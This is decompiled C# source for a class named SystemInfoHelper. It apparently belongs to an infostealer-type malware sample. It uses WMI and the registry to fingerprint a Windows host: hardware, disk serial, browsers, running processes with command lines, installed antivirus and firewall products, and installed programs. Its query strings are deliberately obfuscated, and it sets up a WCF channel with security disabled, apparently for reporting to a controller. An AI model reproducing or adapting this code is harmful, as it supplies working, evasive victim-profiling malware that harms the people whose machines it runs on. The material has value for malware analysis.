using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

// Token: 0x02000042 RID: 66
public static class SystemInfoHelper
{
	// Token: 0x0600012F RID: 303 RVA: 0x0000A25C File Offset: 0x0000845C
	public static System.ServiceModel.Channels.Binding CreateBind()
	{
		return new NetTcpBinding
		{
			MaxReceivedMessageSize = 2147483647L,
			MaxBufferPoolSize = 2147483647L,
			CloseTimeout = TimeSpan.FromMinutes(30.0),
			OpenTimeout = TimeSpan.FromMinutes(30.0),
			ReceiveTimeout = TimeSpan.FromMinutes(30.0),
			SendTimeout = TimeSpan.FromMinutes(30.0),
			TransferMode = TransferMode.Buffered,
			ReaderQuotas = new XmlDictionaryReaderQuotas
			{
				MaxDepth = 44567654,
				MaxArrayLength = int.MaxValue,
				MaxBytesPerRead = int.MaxValue,
				MaxNameTableCharCount = int.MaxValue,
				MaxStringContentLength = int.MaxValue
			},
			Security = new NetTcpSecurity
			{
				Mode = SecurityMode.None,
				Message = new MessageSecurityOverTcp
				{
					ClientCredentialType = MessageCredentialType.None
				}
			}
		};
	}

	// Token: 0x06000130 RID: 304 RVA: 0x0000A344 File Offset: 0x00008544
	public static List<Entity_HardwareInfo> GetProcessors()
	{
		List<Entity_HardwareInfo> list = new List<Entity_HardwareInfo>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELSystem.Windows.FormsECT * FRSystem.Windows.FormsOM WinSystem.Windows.Forms32_ProcSystem.Windows.Formsessor".Replace("System.Windows.Forms", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							list.Add(new Entity_HardwareInfo
							{
								name = (managementObject["Name"] as string),
								value = Convert.ToString(managementObject["NumberOfCores"]),
								Id3 = Entity_HardwareType.Id1
							});
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000131 RID: 305 RVA: 0x0000A448 File Offset: 0x00008648
	public static List<Entity_HardwareInfo> GetGraphicCards()
	{
		List<Entity_HardwareInfo> list = new List<Entity_HardwareInfo>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("roSystem.Linqot\\CISystem.LinqMV2".Replace("System.Linq", string.Empty), "SELSystem.LinqECT * FRSystem.LinqOM WinSystem.Linq32_VideoCoSystem.Linqntroller".Replace("System.Linq", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							uint num = Convert.ToUInt32(managementObject["AdapterRAM"]);
							if (num > 0U)
							{
								list.Add(new Entity_HardwareInfo
								{
									name = (managementObject["Name"] as string),
									value = num.ToString(),
									Id3 = Entity_HardwareType.Id2
								});
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			
		}
		return list;
	}

	// Token: 0x06000132 RID: 306 RVA: 0x0000A56C File Offset: 0x0000876C
	public static List<BrowserInfo> GetBrowsers()
	{
		List<BrowserInfo> list = new List<BrowserInfo>();
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				BrowserInfo browser = new BrowserInfo();
				RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
				browser.Name = (string)registryKey2.GetValue(null);
				RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
				browser.Path = registryKey3.GetValue(null).ToString().StripQuotes();
				if (browser.Path != null)
				{
					browser.version = FileVersionInfo.GetVersionInfo(browser.Path).FileVersion;
				}
				else
				{
					browser.version = "Unknown Version";
				}
				list.Add(browser);
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000133 RID: 307 RVA: 0x0000A658 File Offset: 0x00008858
	public static string GetSerialNumber()
	{
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELESystem.ManagementCT * FRSystem.ManagementOM WiSystem.Managementn32_DisSystem.ManagementkDrivSystem.Managemente".Replace("System.Management", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							return managementObject["SerialNumber"] as string;
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x06000134 RID: 308 RVA: 0x0000A72C File Offset: 0x0000892C
	public static List<string> ListOfProcesses()
	{
		List<string> list = new List<string>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher
				(	"SELSystem.Text.RegularExpressionsECT * FRSystem.Text.RegularExpressionsOM Win32_P" +
					"System.Text.RegularExpressionsrocess WSystem.Text.RegularExpressionshere SessSystem.Text.RegularExpressions" +
					"ionId='".Replace("System.Text.RegularExpressions", string.Empty) + Process.GetCurrentProcess().SessionId + "'"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							List<string> list2 = list;
							string[] array = new string[6];
							array[0] = new string(new char[]
							{
								'I',
								'D',
								':',
								' '
							});
							int num = 1;
							object obj = managementObject[new string(new char[]
							{
								'P',
								'r',
								'o',
								'c',
								'e',
								's',
								's',
								'I',
								'd'
							})];
							array[num] = ((obj != null) ? obj.ToString() : null);
							array[2] = new string(new char[]
							{
								',',
								' ',
								'N',
								'a',
								'm',
								'e',
								':',
								' '
							});
							int num2 = 3;
							object obj2 = managementObject[new string(new char[]
							{
								'N',
								'a',
								'm',
								'e'
							})];
							array[num2] = ((obj2 != null) ? obj2.ToString() : null);
							array[4] = new string(new char[]
							{
								',',
								' ',
								'C',
								'o',
								'm',
								'm',
								'a',
								'n',
								'd',
								'L',
								'i',
								'n',
								'e',
								':',
								' '
							});
							int num3 = 5;
							object obj3 = managementObject[new string(new char[]
							{
								'C',
								'o',
								'm',
								'm',
								'a',
								'n',
								'd',
								'L',
								'i',
								'n',
								'e'
							})];
							array[num3] = ((obj3 != null) ? obj3.ToString() : null);
							list2.Add(string.Concat(array));
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000135 RID: 309 RVA: 0x0000A92C File Offset: 0x00008B2C
	public static List<string> GetInstalledAVs()
	{
		List<string> installed_avs = new List<string>();
		try
		{
			foreach (string str in new string(new char[]
			{
				'A',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'n',
				't',
				'i',
				'v',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'i',
				'r',
				'u',
				's',
				'P',
				'r',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'o',
				'd',
				'u',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'c',
				't',
				'|',
				'A',
				'n',
				't',
				'i',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'S',
				'p',
				'y',
				'W',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'a',
				'r',
				'e',
				'P',
				'r',
				'o',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'd',
				'u',
				'c',
				't',
				'|',
				'F',
				'i',
				'r',
				'e',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'w',
				'a',
				'l',
				'l',
				'P',
				'r',
				'o',
				'd',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'u',
				'c',
				't'
			}).Replace("FileSystem", string.Empty).Split(new char[]
			{
				'|'
			}))
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[]
					{
						'R',
						'O',
						'O',
						'T',
						'\\',
						'S',
						'e',
						'c',
						'u',
						'r',
						'i',
						't',
						'y',
						'C',
						'e',
						'n',
						't',
						'e',
						'r'
					}), new string(new char[]
					{
						'S',
						'E',
						'L',
						'E',
						'C',
						'T',
						' ',
						'*',
						' ',
						'F',
						'R',
						'O',
						'M',
						' '
					}) + str))
					{
						using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
						{
							foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
							{
								try
								{
									if (!installed_avs.Contains(managementBaseObject[new string(new char[]
									{
										'd',
										'i',
										's',
										'p',
										'l',
										'a',
										'y',
										'N',
										'a',
										'm',
										'e'
									})] as string))
									{
										installed_avs.Add(managementBaseObject[new string(new char[]
										{
											'd',
											'i',
											's',
											'p',
											'l',
											'a',
											'y',
											'N',
											'a',
											'm',
											'e'
										})] as string);
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
			}
			foreach (string str2 in new string(new char[]
			{
				'A',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'n',
				't',
				'i',
				'v',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'i',
				'r',
				'u',
				's',
				'P',
				'r',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'o',
				'd',
				'u',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'c',
				't',
				'|',
				'A',
				'n',
				't',
				'i',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'S',
				'p',
				'y',
				'W',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'a',
				'r',
				'e',
				'P',
				'r',
				'o',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'd',
				'u',
				'c',
				't',
				'|',
				'F',
				'i',
				'r',
				'e',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'w',
				'a',
				'l',
				'l',
				'P',
				'r',
				'o',
				'd',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'u',
				'c',
				't'
			}).Replace("FileSystem", string.Empty).Split(new char[]
			{
				'|'
			}))
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher(new string(new char[]
					{
						'R',
						'O',
						'O',
						'T',
						'\\',
						'S',
						'e',
						'c',
						'u',
						'r',
						'i',
						't',
						'y',
						'C',
						'e',
						'n',
						't',
						'e',
						'r',
						'2'
					}), new string(new char[]
					{
						'S',
						'E',
						'L',
						'E',
						'C',
						'T',
						' ',
						'*',
						' ',
						'F',
						'R',
						'O',
						'M',
						' '
					}) + str2))
					{
						using (ManagementObjectCollection managementObjectCollection2 = managementObjectSearcher2.Get())
						{
							foreach (ManagementBaseObject managementBaseObject2 in managementObjectCollection2)
							{
								try
								{
									if (!installed_avs.Contains(managementBaseObject2[new string(new char[]
									{
										'd',
										'i',
										's',
										'p',
										'l',
										'a',
										'y',
										'N',
										'a',
										'm',
										'e'
									})] as string))
									{
										installed_avs.Add(managementBaseObject2[new string(new char[]
										{
											'd',
											'i',
											's',
											'p',
											'l',
											'a',
											'y',
											'N',
											'a',
											'm',
											'e'
										})] as string);
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return installed_avs;
	}

	// Token: 0x06000136 RID: 310 RVA: 0x0000ACCC File Offset: 0x00008ECC
	public static List<string> GetProcessesByName(string[] parts)
	{
		List<string> list = new List<string>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SSystem.ELECT * FRSystem.OM WiSystem.n32_ProcSystem.ess WherSystem.e SessiSystem.onId='".Replace("System.", string.Empty) + Process.GetCurrentProcess().SessionId + "'"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							object obj = managementObject[new string(new char[]
							{
								'N',
								'a',
								'm',
								'e'
							})];
							if (((obj != null) ? obj.ToString() : null) == string.Join("", parts))
							{
								List<string> list2 = list;
								object obj2 = managementObject["ExecutablePath"];
								list2.Add((obj2 != null) ? obj2.ToString() : null);
							}
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000137 RID: 311 RVA: 0x0000AE00 File Offset: 0x00009000
	public static List<string> ListOfPrograms()
	{
		List<string> list = new List<string>();
		try
		{
			string name = new string(new char[]
			{
				'S',
				'O',
				'F',
				'T',
				'W',
				'A',
				'R',
				'E',
				'\\',
				'M',
				'i',
				'c',
				'r',
				'o',
				's',
				'o',
				'f',
				't',
				'\\',
				'W',
				'i',
				'n',
				'd',
				'o',
				'w',
				's',
				'\\',
				'C',
				'u',
				'r',
				'r',
				'e',
				'n',
				't',
				'V',
				'e',
				'r',
				's',
				'i',
				'o',
				'n',
				'\\',
				'U',
				'n',
				'i',
				'n',
				's',
				't',
				'a',
				'l',
				'l'
			});
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
			{
				foreach (string name2 in registryKey.GetSubKeyNames())
				{
					try
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name2))
						{
							string text = (string)((registryKey2 != null) ? registryKey2.GetValue(new string(new char[]
							{
								'D',
								'i',
								's',
								'p',
								'l',
								'a',
								'y',
								'N',
								'a',
								'm',
								'e'
							})) : null);
							string text2 = (string)((registryKey2 != null) ? registryKey2.GetValue(new string(new char[]
							{
								'D',
								'i',
								's',
								'p',
								'l',
								'a',
								'y',
								'V',
								'e',
								'r',
								's',
								'i',
								'o',
								'n'
							})) : null);
							if (!string.IsNullOrEmpty(text) && !string.IsNullOrWhiteSpace(text2))
							{
								text = text.Trim();
								text2 = text2.Trim();
								list.Add(Regex.Replace(text + " [" + text2 + "]", new string(new char[]
								{
									'[',
									'^',
									'\\',
									'u',
									'0',
									'0',
									'2',
									'0',
									'-',
									'\\',
									'u',
									'0',
									'0',
									'7',
									'F',
									']'
								}), string.Empty));
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return (from x in list
		orderby x
		select x).ToList<string>();
	}

	// Token: 0x06000138 RID: 312 RVA: 0x0000AFD0 File Offset: 0x000091D0
	public static List<string> AvailableLanguages()
	{
		List<string> result = new List<string>();
		try
		{
			return (from InputLanguage lang in InputLanguage.InstalledInputLanguages
			select lang.Culture.EnglishName).ToList<string>();
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000139 RID: 313 RVA: 0x0000B030 File Offset: 0x00009230
	public static string CollectMemory()
	{
		string result = "Concat0 MConcatb oConcatr Concat0".Replace("Concat", string.Empty);
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELEMemoryCT * FMemoryROM WiMemoryn32_OperMemoryatingSMemoryystem".Replace("Memory", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							double num = Convert.ToDouble(managementObject[new string(new char[]
							{
								'T',
								'o',
								't',
								'a',
								'l',
								'V',
								'i',
								's',
								'i',
								'b',
								'l',
								'e',
								'M',
								'e',
								'm',
								'o',
								'r',
								'y',
								'S',
								'i',
								'z',
								'e'
							})]);
							double num2 = num * 1024.0;
							double num3 = Math.Round(num / 1024.0, 2);
							result = string.Format("{0}{1}{2}", num3, new string(new char[]
							{
								' ',
								'M',
								'B',
								' ',
								'o',
								'r',
								' '
							}), num2).Replace(',', '.');
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x0600013A RID: 314 RVA: 0x0000B180 File Offset: 0x00009380
	public static string GetWindowsVersion()
	{
		try
		{
			string str;
			try
			{
				str = (Environment.Is64BitOperatingSystem ? "x64" : "x32");
			}
			catch (Exception)
			{
				str = "x86";
			}
			string text = SystemInfoHelper.GetWindowsVersion("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
			text = text + " " + SystemInfoHelper.GetWindowsVersion("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
			if (!string.IsNullOrEmpty(text))
			{
				return text + " " + str;
			}
		}
		catch (Exception)
		{
		}
		return string.Empty;
	}

	// Token: 0x0600013B RID: 315 RVA: 0x0000B20C File Offset: 0x0000940C
	[CompilerGenerated]
	internal static string GetWindowsVersion(string key, string value)
	{
		string result;
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key);
			result = (((registryKey != null) ? registryKey.GetValue(value).ToString() : null) ?? string.Empty);
		}
		catch
		{
			result = string.Empty;
		}
		return result;
	}
}
